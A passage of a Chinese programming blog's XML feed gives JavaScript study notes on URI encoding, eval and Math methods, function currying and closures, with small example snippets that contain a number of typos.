class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(String.fromCharCode(104,101,108,108,111));  //&quot;hello&quot;</span><br></pre></td></tr></table></figure></p><h2 id="单体内置对象"><a href="#单体内置对象" class="headerlink" title="单体内置对象"></a>单体内置对象</h2><p>开发人员不必显示的实例化内置对象</p><h3 id="Global对象"><a href="#Global对象" class="headerlink" title="Global对象"></a>Global对象</h3><h4 id="URI编码方法"><a href="#URI编码方法" class="headerlink" title="URI编码方法"></a>URI编码方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var uri = &quot;http://www.wrox.com/illegal.value.html#start&quot;;</span><br><span class="line">alert(encodeURI(url);  </span><br><span class="line">//https://www.wrox.com/illegal%20value.html#start</span><br><span class="line">alert(encodeURIComponent(url));  </span><br><span class="line">//https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start</span><br></pre></td></tr></table></figure><p>encodeURI不会对URI本身进行编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var uri2 = &quot;https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start&quot;;</span><br><span class="line">alert(decodeURI(uri)); </span><br><span class="line">//https%3A%2F%2Fwww.wrox.com%2Fillegal%20value.html%23start</span><br><span class="line">alert(decodeURIComponent(uri));</span><br><span class="line">//https://www.wrox.com/illegal%20value.html#start</span><br></pre></td></tr></table></figure></p><p>decodeURI只能对encodeURI转换后的字符进行解码，而decodeURIComponent会将所有特殊字符解码</p><h4 id="eval方法"><a href="#eval方法" class="headerlink" title="eval方法"></a>eval方法</h4><p>通过eval执行的代码被认为是包含该次调用的执行环境的一部分，因此被执行的代码具有与该执行环境相同的作用域链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var msg = &quot;hello world&quot;;</span><br><span class="line">eval(&quot;alert(msg)&quot;);  //&quot;hello world&quot;</span><br></pre></td></tr></table></figure></p><h4 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var color = &quot;red&quot;;</span><br><span class="line">function sayColor()&#123;</span><br><span class="line">    alert(window.color);</span><br><span class="line">&#125;</span><br><span class="line">window.sayColor();  //&quot;red&quot;</span><br></pre></td></tr></table></figure><h3 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h3><h4 id="min和max方法"><a href="#min和max方法" class="headerlink" title="min和max方法"></a>min和max方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var max = Math.max(3,54,32,16);</span><br><span class="line">alert(max);  //54</span><br><span class="line">var min = Math.min(3,54,32,16);</span><br><span class="line">alert(min);  //3</span><br></pre></td></tr></table></figure><p>可以使用apply方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var values = [1,2,3,4,5,6,7,8];</span><br><span class="line">var max = Math.max.apply(Math,values);</span><br></pre></td></tr></table></figure></p><h4 id="四舍五入方法"><a href="#四舍五入方法" class="headerlink" title="四舍五入方法"></a>四舍五入方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Math.ceil(25.9));  //总是将数值向上舍入为最近的整数，26</span><br><span class="line">alert(Math.floor(25.9));  //总是将数值向下舍入为最近的整数，25</span><br><span class="line">alert(Math.round(25.9));  //四舍五入为最近的整数，26</span><br></pre></td></tr></table></figure><h4 id="random方法"><a href="#random方法" class="headerlink" title="random方法"></a>random方法</h4><p>值：Math.floor(Math.random()*可能的值的总数+第一个可能的值)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var num = Math.floor(Math.random()*9+2);  //返回2-10的值</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数柯里化</title>
      <link href="/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html"/>
      <url>/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>老是听大佬们口中谈及函数柯里化，在没有了解之前，我一直认为这是一个十分高深的东西，然而在接触后也深深被他的魅力吸引，那么究竟什么是柯里化？柯里化又有什么好处？作为一个前端工程狮，这是你必须掌握的高级技能。</p></blockquote><h2 id="什么是柯里化-Currying"><a href="#什么是柯里化-Currying" class="headerlink" title="什么是柯里化(Currying)"></a>什么是柯里化(Currying)</h2><p>柯里化是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数且返回结果的新函数的技术。也就是将具有多个元的函数转化为具有较少元的函数。</p><a id="more"></a><p>来看下面的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function add(a,b,c)&#123;</span><br><span class="line">    return a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1,2,3);             //3 </span><br><span class="line">curryingAdd(1)(2)(3);   //3</span><br></pre></td></tr></table></figure></p><h2 id="Currying的核心思想"><a href="#Currying的核心思想" class="headerlink" title="Currying的核心思想"></a>Currying的核心思想</h2><p>柯里化的核心思想就是降低通用性，提高适用性。<br>举个例子说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ajax(&quot;get&quot;,&quot;url&quot;,&quot;data&quot;);</span><br><span class="line">Ajaxget(&quot;url&quot;,&quot;data&quot;);</span><br></pre></td></tr></table></figure></p><p>上述代码中，Ajax是一个通用性的方法，而Ajaxget是一个只针对get请求的方法，从性能上来看，通用性的方法需要对请求的类型进行判断，而通过调用Ajaxget可以减少判断，同时我们可以直接从api上得知请求的类型，对于后期的开发维护也有帮助。</p><h2 id="Currying的特点"><a href="#Currying的特点" class="headerlink" title="Currying的特点"></a>Currying的特点</h2><ul><li>参数复用：如果是相同的参数，在计算之后不需要再次重新传参计算</li><li>提前返回：多次调用多次内部判断，可以直接把第一次判断的结果返回外部接受</li><li>延迟执行：避免重复执行程序，等真正需要结果的时候，再执行</li></ul><h3 id="参数复用"><a href="#参数复用" class="headerlink" title="参数复用"></a>参数复用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function curryingAdd(a)&#123;</span><br><span class="line">    return function(b)&#123;</span><br><span class="line">        return function(c)&#123;</span><br><span class="line">            return a + b + c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var add1 = curryingAdd(1);</span><br><span class="line">var add2 = add1(2);</span><br><span class="line"></span><br><span class="line">console.log(add2(3));</span><br><span class="line">console.log(add2(4));</span><br></pre></td></tr></table></figure><p>还是以刚才的例子做说明，通过复用参数，我们可以实现空间换时间，在调用add2进行计算时，实际上只进行了一次计算。</p><h3 id="提前返回"><a href="#提前返回" class="headerlink" title="提前返回"></a>提前返回</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function(el, type, fn, capture)&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        el.addEventListener(type, function()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        el.attachEvent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEvent(div,click,callback,false);   //判断一次</span><br><span class="line">addEvent(p,click,callback,false);     //判断二次</span><br><span class="line">addEvent(span,click,callback,false);  //判断三次</span><br></pre></td></tr></table></figure><p>上述代码是兼容浏览器添加事件的一段常用的代码，但在使用中，会多次进行浏览器版本的判断，而浏览器的版本在打开浏览器的时候就已经确定，重复的判断反而会降低使用性能，所以可以利用柯里化思想对上述代码进行下面的改进。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var addEvent = function()&#123;</span><br><span class="line">    if(window.addEventListener)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.addEventListener(type, function()&#123;&#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(window.attachEvent)&#123;</span><br><span class="line">        return function(el, type, fn, capture)&#123;</span><br><span class="line">            el.attachEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只判断一次</span><br><span class="line">var addEvent_new = addEvent</span><br><span class="line"></span><br><span class="line">addEvent_new(div,click,callback,false);   </span><br><span class="line">addEvent_new(p,click,callback,false);     </span><br><span class="line">addEvent_new(span,click,callback,false);</span><br></pre></td></tr></table></figure><h3 id="延迟执行"><a href="#延迟执行" class="headerlink" title="延迟执行"></a>延迟执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var curryScore = function(fn)&#123;</span><br><span class="line">    var _allScore = [];  //存放分数</span><br><span class="line">    return function()&#123;</span><br><span class="line">        if(arguments.length === 0)&#123;</span><br><span class="line">            return fn.apply(null,_allScore); //对象冒充，形实转换</span><br><span class="line">        &#125;</span><br><span class="line">        _allScorll = _allScore.concat([].slice.call(arguments));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var allScore = 0;</span><br><span class="line">var addScore = curryScore(function()&#123;</span><br><span class="line">    for(var i = 0; i &lt; arguments.length; i++)&#123;</span><br><span class="line">        allScore +=arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">addScore(2);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(3);</span><br><span class="line">addScore(2);</span><br><span class="line">addScore(1);</span><br><span class="line">addScore();  //11</span><br></pre></td></tr></table></figure><p>上述代码的思想就是先把传入的参数都保存起来，当达到某个延迟条件时，进行输出。</p><h2 id="通用封装方法"><a href="#通用封装方法" class="headerlink" title="通用封装方法"></a>通用封装方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 支持多参数传递</span><br><span class="line">function progressCurrying(fn, args) &#123;</span><br><span class="line"></span><br><span class="line">    var _this = this</span><br><span class="line">    var len = fn.length;</span><br><span class="line">    var args = args || [];</span><br><span class="line"></span><br><span class="line">    return function() &#123;</span><br><span class="line">        var _args = Array.prototype.slice.call(arguments);</span><br><span class="line">        Array.prototype.push.apply(args, _args);</span><br><span class="line"></span><br><span class="line">        // 如果参数个数小于最初的fn.length，则递归调用，继续收集参数</span><br><span class="line">        if (_args.length &lt; len) &#123;</span><br><span class="line">            return progressCurrying.call(_this, fn, _args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 参数收集完毕，则执行fn</span><br><span class="line">        return fn.apply(this, _args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Currying的性能开销"><a href="#Currying的性能开销" class="headerlink" title="Currying的性能开销"></a>Currying的性能开销</h2><p>虽然柯里化提高了函数的适用性，但是它还是会产生一些性能的开销。</p><ul><li>存取arguments对象通常要比存取命名参数要慢一点</li><li>一些老版本的浏览器在arguments.length的实现上是相当慢的</li><li>使用fn.apply() 和 fn.call()通常比直接调用fn()稍微慢点</li><li>创建大量嵌套作用域和闭包函数会带来花销，无论是在内存还是速度上</li></ul><p>但性能的主要瓶颈在操作DOM结点的开销，Currying这部分性能损耗基本可以忽略不计。</p><h2 id="经典柯里化面试题"><a href="#经典柯里化面试题" class="headerlink" title="经典柯里化面试题"></a>经典柯里化面试题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 实现一个add方法，使计算结果能够满足如下预期：</span><br><span class="line">add(1)(2)(3) = 6;</span><br><span class="line">add(1, 2, 3)(4) = 10;</span><br><span class="line">add(1)(2)(3)(4)(5) = 15;</span><br><span class="line"></span><br><span class="line">function add() &#123;</span><br><span class="line">    // 第一次执行时，定义一个数组专门用来存储所有的参数</span><br><span class="line">    var _args = Array.prototype.slice.call(arguments);</span><br><span class="line"></span><br><span class="line">    // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值</span><br><span class="line">    var _adder = function() &#123;</span><br><span class="line">        _args.push(...arguments);</span><br><span class="line">        return _adder;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 利用toString隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回</span><br><span class="line">    _adder.toString = function () &#123;</span><br><span class="line">        return _args.reduce(function (a, b) &#123;</span><br><span class="line">            return a + b;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    return _adder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(1)(2)(3)                // 6</span><br><span class="line">add(1, 2, 3)(4)             // 10</span><br><span class="line">add(1)(2)(3)(4)(5)          // 15</span><br><span class="line">add(2, 6)(1)                // 9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS函数表达式（闭包）</title>
      <link href="/JS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89.html"/>
      <url>/JS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E9%97%AD%E5%8C%85%EF%BC%89.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="函数声明和函数表达式"><a href="#函数声明和函数表达式" class="headerlink" title="函数声明和函数表达式"></a>函数声明和函数表达式</h3><p>函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sayHi();</span><br><span class="line">function sayHi()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>函数表达式（匿名函数）：匿名函数的name属性是空字符串，有时也称函数拉姆达函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>使用arguments.callee指向正在执行的函数指针，可以实现对函数的递归调用，且比直接使用函数名更加安全。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function facorial(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * arguments.callee(num-1); //使之与函数名解耦合</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上方法在严格模式下会出错，在严格模式下，可使用命名函数表达式达成相同的结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var factorial = (function f(num)&#123;</span><br><span class="line">    if(num &lt;= 1)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return num * f(num-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><p>闭包是指有权访问另一个函数作用域中的变量的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createComparesonFuncion(popertyName)&#123;</span><br><span class="line">    return function(object1,object2)&#123;</span><br><span class="line">        var value1 = object1[propertyName];</span><br><span class="line">        var value2 = object2[propertyName];</span><br><span class="line">        if(value1 &lt; value2)&#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125; else if(value1 &gt; value2)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>一般当函数执行完毕后，局部活动对象就会被销毁，内存中仅保存全局作用域，但闭包不同，在另一个函数内部定义的函数会将包含函数（即外部函数）的活动对象加到它的作用域链中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\创建函数</span><br><span class="line">var compareName = createComparesonFunction(&quot;name&quot;);</span><br><span class="line">var result = compareNames(&#123;name:&quot;Nicholas&quot;&#125;,&#123;name:&quot;Greg&quot;&#125;);  //调用函数</span><br><span class="line">compareNames = null;  //解除对匿名函数的引用</span><br></pre></td></tr></table></figure></p><p><img src="../assets/20190527/pic1.png" alt="Alt text"></p><h3 id="闭包与变量"><a href="#闭包与变量" class="headerlink" title="闭包与变量"></a>闭包与变量</h3><p>闭包只能取得包含函数中任何变量的最后一个值，因为闭包保存的是整个变量对象，而不是某个特殊变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function() &#123;</span><br><span class="line">            return i;   //每次返回都为10</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上代码，通过匿名函数强制让闭包行为符合预期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function(num) &#123;   //使用匿名函数，则立即执行匿名函数</span><br><span class="line">            return function(num)&#123;</span><br><span class="line">                return num;</span><br><span class="line">            &#125;;   </span><br><span class="line">        &#125;(i);   //值传递，把i赋值给num</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this对象"><a href="#this对象" class="headerlink" title="this对象"></a>this对象</h3><p>匿名函数的执行环节具有全局性，因此其this对象通常指向window。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;,</span><br><span class="line">    getNameFunc ： function()&#123;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return this.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());   //&quot;The window&quot;</span><br></pre></td></tr></table></figure></p><p>每个函数在调用时都会自动取得两个特殊变量<code>this</code>和<code>arguments</code>内部函数只会搜索到其活动对象为止，所以不能直接访问外部函数中的这两个变量。</p><p>可以通过把外部作用域中的this对象保存在闭包能访问到的变量里，让闭包访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getNameFunc : function()&#123;</span><br><span class="line">        var that = this;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return that.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());  //&quot;MyObject&quot;</span><br></pre></td></tr></table></figure></p><p>特殊情况，this值可能会意外地改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getName : function()&#123;</span><br><span class="line">        treturn this.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">object.getName();   //&quot;MyObject&quot;</span><br><span class="line">(object.getName)();   //&quot;MyObject&quot;,相当于引用了一个函数，this得到了维持</span><br><span class="line">(object.getName = object.getName)();   //&quot;The window&quot;，this值不能得到维持</span><br></pre></td></tr></table></figure></p><h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//该闭包导致element的引用数无法减少，element不会被回收</span><br><span class="line">function assignHandler()&#123;</span><br><span class="line">    var element = document.getElementById(&quot;someElement&quot;);</span><br><span class="line">    element.onlick = function()&#123;</span><br><span class="line">        alert(element.id);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模仿块级作用域"><a href="#模仿块级作用域" class="headerlink" title="模仿块级作用域"></a>模仿块级作用域</h3><p>JavaScript没有块级作用域的概念<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fucntion outputNumbers(count)&#123;</span><br><span class="line">    for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">        alert(i);</span><br><span class="line">    &#125;</span><br><span class="line">    var i;    //重新声明变量也不会改变它的值</span><br><span class="line">    alert(i);  //count值，从i定义开始，就可以在函数内部随处访问</span><br><span class="line">    //而在Java，c++中，变量i只会在for循环的语句块中有定义</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用匿名函数来模仿块级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;)();   //定义并立即调用了一个匿名函数，括号表示它实际上是一个函数表达式</span><br><span class="line">var someFunction = function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;;</span><br><span class="line">someFunction();</span><br></pre></td></tr></table></figure></p><p>JavaScript将function当作一个函数声明的开始，而函数声明后面不能跟圆括号，而函数表达式可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function outputNumber(count)&#123;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">            alert(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    alert(i);   //出错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>私有作用域的i在执行结束后被销毁，私有作用域能访问count，因为其为闭包</p><h3 id="私有变量"><a href="#私有变量" class="headerlink" title="私有变量"></a>私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 